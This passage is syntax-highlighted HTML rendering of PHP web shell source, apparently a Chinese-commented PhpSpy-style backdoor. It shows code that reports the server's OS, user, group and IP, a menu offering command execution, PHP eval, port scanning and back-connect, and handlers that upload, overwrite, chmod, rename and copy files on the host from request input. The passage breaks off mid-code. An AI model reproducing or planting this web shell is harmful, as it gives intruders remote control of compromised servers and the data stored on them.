background-color: #2d2d2d;\">function_exists(<\/span><span style=\"color: #66cccc;\">'posix_getegid'<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">user<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">get_current_user(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">uid<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">getmyuid(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">gid<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">getmygid(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">group<\/span> = <span style=\"color: #66cccc;\">\"?\"<\/span>;\n} <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">uid<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">posix_getpwuid(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">posix_geteuid(<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">gid<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">posix_getgrgid(<\/span>@<span style=\"color: #cccccc; background-color: #2d2d2d;\">posix_getegid(<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">user<\/span> = $<span style=\"color: #ffcc66;\">uid<\/span>[<span style=\"color: #66cccc;\">'name'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">uid<\/span> = $<span style=\"color: #ffcc66;\">uid<\/span>[<span style=\"color: #66cccc;\">'uid'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">group<\/span> = $<span style=\"color: #ffcc66;\">gid<\/span>[<span style=\"color: #66cccc;\">'name'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">gid<\/span> = $<span style=\"color: #ffcc66;\">gid<\/span>[<span style=\"color: #66cccc;\">'gid'<\/span>];\n}\n\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;table<\/span> <span style=\"color: #6699cc;\">width=<\/span><span style=\"color: #66cccc;\">\"100%\"<\/span> <span style=\"color: #6699cc;\">border=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span> <span style=\"color: #6699cc;\">cellpadding=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span> <span style=\"color: #6699cc;\">cellspacing=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;tr<\/span> <span style=\"color: #6699cc;\">class=<\/span><span style=\"color: #66cccc;\">\"head\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td&gt;&lt;span<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"float:right;\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">echo<\/span> @<span style=\"color: #cccccc; background-color: #2d2d2d;\">php_uname(<\/span>);<span style=\"color: #cc99cc;\">?&gt;<\/span> \/ <span style=\"color: #f2777a; font-weight: bold;\">User<\/span>:<span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">e<\/span><span style=\"color: #99cc99; text-decoration: underline;\">cho<\/span><span style=\"text-decoration: underline;\"> $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">uid<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' ( '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">user<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' ) \/ Group: '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">gid<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' ( '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">group<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' )'<\/span><span style=\"text-decoration: underline;\">;<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/span&gt;<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">&lt;?php<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #99cc99; text-decoration: underline;\">echo<\/span><span style=\"text-decoration: underline;\"> $<\/span><span style=\"color: #6699cc; text-decoration: underline;\">_SERVER<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'HTTP_HOST'<\/span><span style=\"text-decoration: underline;\">];<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"text-decoration: underline;\"> (<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">&lt;?php<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #99cc99; text-decoration: underline;\">echo<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">gethostbyname(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #6699cc; text-decoration: underline;\">_SERVER<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'SERVER_NAME'<\/span><span style=\"text-decoration: underline;\">]);<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"text-decoration: underline;\">)<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/tr&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;tr<\/span> <span style=\"color: #6699cc;\">class=<\/span><span style=\"color: #66cccc;\">\"alt1\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;span<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"float:right;\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">PHP<\/span> <span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #6699cc;\">PHP_VERSION<\/span>;<span style=\"color: #cc99cc;\">?&gt;<\/span> \/ <span style=\"color: #f2777a; font-weight: bold;\">Safe<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Mode<\/span><span style=\"text-decoration: underline;\">:<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">&lt;?php<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #99cc99; text-decoration: underline;\">echo<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">getcfg(<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'safe_mode'<\/span><span style=\"text-decoration: underline;\">);<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/span&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('logout');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Logout<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('file');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">File<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Manager<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('mysqladmin');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">MYSQL<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Manager<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('sqlfile');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">MySQL<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Upload<\/span> &amp;<span style=\"color: #f2777a; font-weight: bold;\">amp<\/span>; <span style=\"color: #f2777a; font-weight: bold;\">Download<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151; text-decoration: underline;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('shell');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Execute<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Command<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('phpenv');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">PHP<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Variable<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('portscan');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Port<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Scan<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('secinfo');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Security<\/span> <span style=\"color: #f2777a; font-weight: bold;\">information<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span> |<span style=\"color: #f2777a; background-color: #515151;\"> <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('eval');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Eval<\/span> <span style=\"color: #f2777a; font-weight: bold;\">PHP<\/span> <span style=\"color: #f2777a; font-weight: bold;\">Code<\/span><span style=\"color: #6699cc;\">&lt;\/a&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span>) {<span style=\"color: #cc99cc;\">?&gt;<\/span> | <span style=\"color: #6699cc;\">&lt;a<\/span> <span style=\"color: #6699cc;\">href=<\/span><span style=\"color: #66cccc;\">\"javascript:g('backconnect');\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Back<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">Connect<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/a&gt;<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">&lt;?php<\/span><span style=\"text-decoration: underline;\"> }<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/tr&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;\/table&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;table<\/span> <span style=\"color: #6699cc;\">width=<\/span><span style=\"color: #66cccc;\">\"100%\"<\/span> <span style=\"color: #6699cc;\">border=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span> <span style=\"color: #6699cc;\">cellpadding=<\/span><span style=\"color: #66cccc;\">\"15\"<\/span> <span style=\"color: #6699cc;\">cellspacing=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span><span style=\"color: #6699cc;\">&gt;&lt;tr&gt;&lt;td&gt;<\/span>\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n$<span style=\"color: #ffcc66;\">errmsg<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span>$<span style=\"color: #ffcc66;\">errmsg<\/span>);\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;<\/span>\n<span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">dir<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dir<\/span> = $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">\"DOCUMENT_ROOT\"<\/span>] ? $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">\"DOCUMENT_ROOT\"<\/span>] : <span style=\"color: #66cccc;\">'.'<\/span>;\n}\n$<span style=\"color: #ffcc66;\">nowpath<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">getPath(<\/span><span style=\"color: #f2777a; font-weight: bold;\">SA_ROOT<\/span>, $<span style=\"color: #ffcc66;\">dir<\/span>);\n<span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">substr(<\/span>$<span style=\"color: #ffcc66;\">dir<\/span>, -<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) != <span style=\"color: #66cccc;\">'\/'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dir<\/span> = $<span style=\"color: #ffcc66;\">dir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span>;\n}\n\n<span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'file'<\/span>) {\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dir_writeable<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_writable(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>) ? <span style=\"color: #66cccc;\">'Writable'<\/span> : <span style=\"color: #66cccc;\">'Non-writable'<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#21019;&#24314;&#30446;&#24405;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">newdirname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mkdirs<\/span> = $<span style=\"color: #ffcc66;\">nowpath<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">newdirname<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">mkdirs<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Directory has already existed'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Directory created '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">mkdir(<\/span>$<span style=\"color: #ffcc66;\">mkdirs<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0777<\/span>) ? <span style=\"color: #66cccc;\">'success'<\/span> : <span style=\"color: #66cccc;\">'failed'<\/span>)<span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">chmod(<\/span>$<span style=\"color: #ffcc66;\">mkdirs<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">0777<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#19978;&#20256;&#25991;&#20214;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">doupfile<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'File upload '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">copy(<\/span>$<span style=\"color: #6699cc;\">_FILES<\/span>[<span style=\"color: #66cccc;\">'uploadfile'<\/span>][<span style=\"color: #66cccc;\">'tmp_name'<\/span>],$<span style=\"color: #ffcc66;\">uploaddir<\/span>.<span style=\"color: #66cccc;\">'\/'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #6699cc; text-decoration: underline;\">_FILES<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'uploadfile'<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'name'<\/span><span style=\"text-decoration: underline;\">]) ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'success'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'failed'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#32534;&#36753;&#25991;&#20214;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">editfilename<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">filecontent<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fp<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fopen(<\/span>$<span style=\"color: #ffcc66;\">editfilename<\/span>,<span style=\"color: #66cccc;\">'w'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Save file '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">fwrite(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>,$<span style=\"color: #ffcc66;\">filecontent<\/span>) ? <span style=\"color: #66cccc;\">'success'<\/span> : <span style=\"color: #66cccc;\">'failed'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">fclose(<\/span>$<span style=\"color: #ffcc66;\">fp<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">pfile<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">newperm<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">pfile<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'The original file does not exist'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">newperm<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">base_convert(<\/span>$<span style=\"color: #ffcc66;\">newperm<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">8<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: #66cccc;\">'Modify file attributes '<\/span>.(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">chmod(<\/span>$<span style=\"color: #ffcc66;\">pfile<\/span>,$<span style=\"color: #ffcc66;\">newperm<\/span>) ? <span style=\"color: #66cccc;\">'success'<\/span> : <span style=\"color: #66cccc;\">'<\/span><span style=\"color: #66cccc; text-decoration: underline;\">failed'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#25913;&#21517;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">oldname<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">newfilename<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">nname<\/span> = $<span style=\"color: #ffcc66;\">nowpath<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">newfilename<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">nname<\/span>) || !<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">oldname<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span>$<span style=\"color: #ffcc66;\">nname<\/span>.<span style=\"color: #66cccc;\">' has already existed or original file does not exist'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(basename(<\/span>$<span style=\"color: #ffcc66;\">oldname<\/span>).<span style=\"color: #66cccc;\">' renamed '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">basename(<\/span>$<span style=\"color: #ffcc66;\">nname<\/span>).(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">rename(<\/span>$<span style=\"color: #ffcc66;\">oldname<\/span>,<span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nname<\/span><span style=\"text-decoration: underline;\">) ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">' success'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'failed'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#22797;&#21046;&#25991;&#20214;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">sname<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">tofile<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">tofile<\/span>) || !<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">sname<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">m(<\/span><span style=\"color: 